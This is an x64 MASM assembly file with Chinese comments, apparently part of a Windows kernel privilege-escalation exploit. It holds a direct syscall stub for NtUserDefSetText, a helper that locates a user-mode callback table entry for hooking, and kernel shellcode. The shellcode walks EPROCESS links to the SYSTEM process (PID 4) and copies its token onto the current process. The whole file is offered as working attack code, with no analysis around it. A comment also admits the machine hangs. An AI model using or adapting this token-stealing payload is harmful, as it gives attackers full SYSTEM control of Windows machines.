.code

; 设置钩子函数
getHookSaveFunctionAddr proc
	mov		rax, gs:[60h]
	mov		rax, [rax+ 58h]
	add		rax, 238h
	ret
getHookSaveFunctionAddr endp

NtUserDefSetText proc

	mov         r10, rcx
	mov         eax, 1080h
	syscall  
	ret  

NtUserDefSetText endp

; shellcode 编写完毕
shellCode proc
	; shellcode编写
	mov rax, gs:[188h]	;Kprcb.Kpthread
	mov rax, [rax+220h]	;process
	mov	rcx, rax	; keep copy value
	mov	rdx, 4		; system PID

findSystemPid:
	mov	rax, [rax+2e8h]	; ActiveProcessLinks : _LIST_ENTRY
	sub	rax, 2e8h
	cmp	[rax+2e0h], rdx
	jnz findSystemPid 

	; 替换Token
	mov rdx, [rax+348h]	; get system token
	mov [rcx+348h], rdx	; copy
	; 这个地方计算一下吧 反正电脑卡着了
	sub rsp,30h
	mov rax, 0aaaaaaaaaaaaaaaah
	mov [rsp], rax
	ret
	
shellCode endp
end